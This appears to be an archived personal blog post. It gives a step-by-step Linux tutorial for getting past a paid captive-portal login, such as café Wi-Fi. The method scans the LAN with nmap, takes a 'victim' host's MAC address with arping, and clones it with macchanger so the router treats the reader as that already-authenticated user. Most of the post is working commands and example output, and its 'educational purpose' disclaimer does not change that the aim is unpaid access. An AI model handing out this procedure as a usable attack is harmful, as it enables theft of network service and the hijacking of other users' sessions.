---
layout: post
title: "Simple hack to connect an authentication needed internet. (like in Starbucks)"
description: "For the notion of tradition I need to say that all the information for educational purpose"
tags: hack linux network
minute: 3
---

> *This post was originally published on erogol.com (hosted on DigitalOcean) and recovered from the [Wayback Machine](https://web.archive.org) after the original server was lost. Some formatting or images may differ from the original.*

For the notion of tradition I need to say that "all the information for educational purpose".

To make use of that trick, you should able to connect to the LAN but cannot connect to internet since it is waiting to fill a authentication form that is not free to fill(generally, if it is free don't mass your mind).

We follow the process as, first look the LAN for other hosts' IP addresses. Find a good looking IP (luckily connected to internet already.). Then retrieve the MAC address of that IP by using ARP protocol. Set your MAC address to retrieved one. Check whether you can surf. If you can't, try another victim IP.

*This method is used in Linux Mint, I've not tried on other OS.*

## Method

Here are the steps: (If you dont have the package just use "sude apt-get install command\_name" to install it) we need **ifconfig,arping,nmap,macchanger** packages

**1.**   First get the root access : **$ sudo -s**

**2.**  Look your IP address of your computer by typing on terminal: **# ifconfig**

```python
(if u r using wireless look for wlan)
(I censored my values for the bad guys)
eth0      Link encap:Ethernet  HWaddr 00:XX:15:3a:XX:93  
inet addr:179.179.179.177  Bcast:XXX.XXX.XXX.xXX  Mask:255.255.254.0
inet6 addr: .....
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:339600 errors:0 dropped:0 overruns:0 frame:0
TX packets:216342 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:319788999 (319.7 MB)  TX bytes:19148521 (19.1 MB)
Interrupt:48 Base address:0xe000
```

The important value is the bold one (**179.179.179.177**)for the present and keep in mind the other bold value (**00:XX:15:3a:XX:93** ). First is your IP number and second is MAC address. We're using the IP of our machine to see the what is the general schema of the IP numbers in the network we belong to search the defined domain of IP addresses other than brute-force method.

**3.**    Use **nmap** program to map the LAN. In that way we acquire the IP addresses running on the LAN.

```python
#nmap -sp 179.179.179.*
```

if you see lots of IP numbers write them to a text file with

```python
#nmap -sp 179.179.179.* > /path/to/file
```

You will see the list of IP numbers. Choose one of them. Suppose we choose **179.179.179.101**

**4.**    Now use **arping** command. That command uses the **ARP** protocol to recover MAC addresses form IP addreses of the hosts.

```python
# arping 179.179.179.101 -c 1
```

-c 1 is the argument that says send one request. You will see a number in format xx:xx:xx:xx:xx:xx. If you cannot get a number like this it means the IP you catched does not belong to LAN you connected. Try another one.

Suppose we get a value like **12:12:12:12:12:12**

**5**.    Now change the MAC address of your wlan card or ethernet card relative to your connection. **macchanger** is the one that makes it.

First down the card.

```python
# ifconfig eth0 down
```

Then type

```python
# macchanger eth0 -m 12:12:12:12:12:12
```

Up the card again

```python
# ifconfig eth0 up
```

Look the MAC address of the card

```python
# ifconfig
```

You suppose to see

```python
eth0      Link encap:Ethernet  HWaddr 12:12:12:12:12:12  
inet addr:179.179.179.101  Bcast:XXX.XXX.XXX.xXX  Mask:255.255.254.0
inet6 addr: .....
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:339600 errors:0 dropped:0 overruns:0 frame:0
TX packets:216342 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:319788999 (319.7 MB)  TX bytes:19148521 (19.1 MB)
Interrupt:48 Base address:0xe000
```

**6.**    You are anonomyous on the LAN and the router will presume you  the victim's computer. Then try to surf on internet. If you cannot connect to internet, it means the victim was just like you triyng to connect internet. Try another victim.

[![Share](https://static.addtoany.com/buttons/favicon.png)](https://www.addtoany.com/share)

### Related posts:

1. [Changing MAC address of your network cards on Linux](http://www.erogol.com/changing-mac-address-of-your-network-cards-on-linux/ "Changing MAC address of your network cards on Linux")
2. [Hacker's first target file /etc/passwrd on Linux ! Why?](http://www.erogol.com/hackers-first-target-file-etcpasswrd-on-linux-why/ "Hacker's first target file /etc/passwrd on Linux ! Why?")